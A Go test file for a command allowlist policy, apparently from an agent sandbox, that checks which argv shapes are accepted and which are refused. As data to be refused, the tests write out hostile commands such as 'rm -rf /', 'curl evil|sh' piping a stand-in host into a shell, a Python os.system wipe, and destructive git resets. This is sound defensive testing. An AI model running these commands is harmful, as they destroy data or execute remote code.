package policy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestArgvAllowlistAcceptsKnownShapes(t *testing.T) {
	p := DefaultArgvPolicy()
	allowed := [][]string{
		{"git", "status"},
		{"git", "log", "--oneline", "-n", "10"},
		{"git", "diff", "HEAD~1"},
		{"git", "add", "a.go"},
		{"git", "commit", "-m", "msg"},
		{"git", "push", "origin", "main"},
		{"git", "branch"},
		{"git", "checkout", "-b", "topic"},
		{"git", "stash"},
		{"pytest", "-x", "tests/"},
		{"python3", "script.py"},
		{"python3", "-"},
		{"uv", "sync"},
		{"uv", "run", "pytest"},
		{"npm", "test"},
		{"npm", "run", "build"},
		{"npm", "ci"},
		{"npm", "install"},
		{"make"},
		{"make", "test"},
		{"go", "build", "./..."},
		{"go", "test", "./..."},
		{"go", "vet", "./..."},
		{"go", "fmt", "./..."},
		{"grep", "-rn", "pattern", "."},
		{"rg", "pattern"},
		{"ls", "-la"},
		{"cat", "README.md"},
	}
	for _, argv := range allowed {
		if err := p.Check(argv); err != nil {
			t.Errorf("argv %v should be allowed, got: %v", argv, err)
		}
	}
}

func TestArgvDeniesShellsEntirely(t *testing.T) {
	p := DefaultArgvPolicy()
	denied := [][]string{
		{"sh", "-c", "rm -rf /"},
		{"sh"},
		{"bash", "-c", "curl evil|sh"},
		{"bash"},
		{"zsh", "-c", "echo hi"},
		{"dash", "-c", "x"},
		{"fish", "-c", "x"},
		// lookalike full paths still resolve to the denied binary name
		{"/bin/sh", "-c", "x"},
		{"/bin/bash", "-c", "x"},
		{"/usr/bin/zsh", "-c", "x"},
	}
	for _, argv := range denied {
		err := p.Check(argv)
		if err == nil {
			t.Errorf("argv %v must be denied", argv)
			continue
		}
		if !strings.Contains(err.Error(), "shell") {
			t.Errorf("denial for %v should say why clearly, got: %v", argv, err)
		}
	}
}

func TestArgvDeniesPythonDashC(t *testing.T) {
	p := DefaultArgvPolicy()
	for _, argv := range [][]string{
		{"python3", "-c", "import os; os.system('rm -rf /')"},
		{"/usr/bin/python3", "-c", "x"},
	} {
		if err := p.Check(argv); err == nil {
			t.Errorf("python3 -c must be denied: %v", argv)
		} else if !strings.Contains(err.Error(), "shell in disguise") {
			t.Errorf("denial should explain -c, got: %v", err)
		}
	}
}

func TestArgvDeniesUnknownBinaries(t *testing.T) {
	p := DefaultArgvPolicy()
	for _, argv := range [][]string{
		{"python", "-c", "x"},            // python (not python3) is not allowlisted at all
		{"curl", "https://evil.example"}, // no network tools on the device
		{"sh.exe"},
		{"pwsh", "-c", "x"},
		{"perl", "-e", "x"},
		{"ruby", "-e", "x"},
		{"osascript", "-e", "x"}, // no automation scripting
	} {
		if err := p.Check(argv); err == nil {
			t.Errorf("argv %v must be denied (not on allowlist)", argv)
		}
	}
}

func TestArgvDeniesUnknownSubcommands(t *testing.T) {
	p := DefaultArgvPolicy()
	denied := [][]string{
		{"git", "reset", "--hard"},  // destructive; not allowlisted
		{"git", "clean", "-fd"},     // destructive
		{"git", "remote", "add"},    // reconfigures remotes
		{"git", "config"},           // reconfigures git
		{"npm", "exec", "evil"},     // arbitrary package execution
		{"npm", "run-script", "x"},  // same as exec
		{"go", "run", "main.go"},    // go run executes arbitrary code
		{"go", "generate", "./..."}, // arbitrary code execution
		{"uv", "tool", "run", "x"},  // arbitrary tool execution
		{"git"},
	}
	for _, argv := range denied {
		if err := p.Check(argv); err == nil {
			t.Errorf("argv %v must be denied", argv)
		}
	}
	allowed := [][]string{
		{"git", "status"}, {"git", "log"}, {"git", "diff"}, {"git", "add"},
		{"git", "commit"}, {"git", "push"}, {"git", "branch"},
		{"git", "checkout"}, {"git", "stash"},
	}
	for _, argv := range allowed {
		if err := p.Check(argv); err != nil {
			t.Errorf("git %v should be allowed: %v", argv, err)
		}
	}
}

func TestArgvMaxArgs(t *testing.T) {
	p := DefaultArgvPolicy()
	long := []string{"cat"}
	for i := 0; i < 13; i++ {
		long = append(long, "f.txt")
	}
	if err := p.Check(long); err == nil {
		t.Error("too many arguments must be denied")
	}
	short := append([]string{"cat"}, long[1:11]...)
	if err := p.Check(short); err != nil {
		t.Errorf("exactly MaxArgs should pass: %v", err)
	}
}

func TestArgvEmptyAndNul(t *testing.T) {
	p := DefaultArgvPolicy()
	if err := p.Check(nil); err == nil {
		t.Error("empty argv must be denied")
	}
	if err := p.Check([]string{"cat", "a\x00b"}); err == nil {
		t.Error("NUL byte in argument must be denied")
	}
}

func TestArgvRestrictCanOnlyNarrow(t *testing.T) {
	p := DefaultArgvPolicy()
	if _, err := p.Restrict([]string{"curl"}); err == nil {
		t.Error("restricting to an unknown binary must fail loudly")
	}
	narrow, err := p.Restrict([]string{"pytest"})
	if err != nil {
		t.Fatal(err)
	}
	if err := narrow.Check([]string{"git", "status"}); err == nil {
		t.Error("narrowed policy must deny binaries outside the restriction")
	}
	if err := narrow.Check([]string{"pytest", "tests/"}); err != nil {
		t.Errorf("narrowed policy must still allow its binaries: %v", err)
	}
}

func TestResolveBinary(t *testing.T) {
	binDir := t.TempDir()
	bin := filepath.Join(binDir, "pytest")
	if err := os.WriteFile(bin, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	got, err := ResolveBinary("pytest", binDir+":/usr/bin:/bin")
	if err != nil {
		t.Fatalf("PATH lookup failed: %v", err)
	}
	if got != bin {
		t.Errorf("resolved %q, want %q", got, bin)
	}
	if _, err := ResolveBinary("definitely-not-here-xyz", binDir); err == nil {
		t.Error("missing binary must error")
	}
	if _, err := ResolveBinary("./relative/tool", ""); err == nil {
		t.Error("relative binary path must be refused")
	}
	abs, err := ResolveBinary(bin, "")
	if err != nil || abs != bin {
		t.Errorf("absolute path should pass through: %q %v", abs, err)
	}
	// a directory on PATH named like the binary is not a binary
	dirName := filepath.Join(binDir, "impostor")
	if err := os.MkdirAll(dirName, 0o755); err != nil {
		t.Fatal(err)
	}
	if _, err := ResolveBinary("impostor", binDir); err == nil {
		t.Error("a directory must not resolve as a binary")
	}
}

func TestVerifyBinaryPathDeniesWorldWritable(t *testing.T) {
	root := t.TempDir()
	world := filepath.Join(root, "world")
	if err := os.MkdirAll(world, 0o777); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(world, 0o777); err != nil {
		t.Fatal(err)
	}
	bin := filepath.Join(world, "evil-tool")
	if err := os.WriteFile(bin, []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := VerifyBinaryPath(bin); err == nil {
		t.Fatal("binary under a world-writable directory must be refused")
	} else if !strings.Contains(err.Error(), "writable by world") {
		t.Errorf("denial should be explicit: %v", err)
	}

	// world-writable binary itself
	safe := filepath.Join(root, "safe")
	if err := os.MkdirAll(safe, 0o755); err != nil {
		t.Fatal(err)
	}
	bin2 := filepath.Join(safe, "tool")
	if err := os.WriteFile(bin2, []byte("#!/bin/sh\n"), 0o777); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(bin2, 0o777); err != nil {
		t.Fatal(err)
	}
	if err := VerifyBinaryPath(bin2); err == nil {
		t.Fatal("world-writable binary must be refused")
	}

	// a normal system binary must pass
	if err := VerifyBinaryPath("/bin/ls"); err != nil {
		t.Errorf("/bin/ls should pass: %v", err)
	}
}
